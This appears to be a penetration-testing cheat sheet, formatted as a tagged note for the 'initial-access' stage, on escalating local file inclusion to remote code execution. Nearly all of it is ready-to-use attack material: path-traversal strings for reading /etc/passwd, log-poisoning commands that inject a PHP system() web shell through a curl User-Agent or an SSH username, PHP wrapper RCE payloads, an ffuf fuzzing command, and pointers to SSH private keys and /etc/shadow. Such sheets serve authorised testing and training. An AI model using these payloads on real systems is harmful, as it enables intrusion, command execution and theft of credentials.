---
id: lfi-rce
title: LFI → RCE
stage: initial-access
tags: [linux, web]
tools:
  - ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://$TARGET/page.php?FUZZ=../../../../etc/passwd" -fs 0
leads_to:
  - rev-shell
---

## Basic LFI Test

```
?page=../../etc/passwd
?file=../../../../etc/passwd
?view=php://filter/convert.base64-encode/resource=index.php
?file=../../../../windows/win.ini
```

## LFI → RCE: Log Poisoning

```bash
# 1. Confirm log read
?file=../../../../var/log/apache2/access.log

# 2. Poison log with PHP in User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://$TARGET/

# 3. Trigger via LFI
?file=../../../../var/log/apache2/access.log&cmd=id
```

## LFI → RCE: SSH Log Poisoning (port 22 open)

```bash
# Send PHP as SSH username
ssh "<?php system(\$_GET['cmd']); ?>"@$TARGET

# Trigger
?file=../../../../var/log/auth.log&cmd=id
```

## PHP Wrappers

```
# Read source (base64)
?file=php://filter/convert.base64-encode/resource=index.php

# RCE (allow_url_include must be on)
?file=data://text/plain,<?php system('id'); ?>
?file=expect://id
```

## LFI Fuzzing

```bash
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -u "http://$TARGET/page.php?FUZZ=../../../../etc/passwd" -fs 0
```

## Notes

Once you have LFI, always check: SSH keys (`/root/.ssh/id_rsa`), `/etc/shadow`, config files under `/var/www/html`. Log poisoning is the most reliable RCE path from LFI.
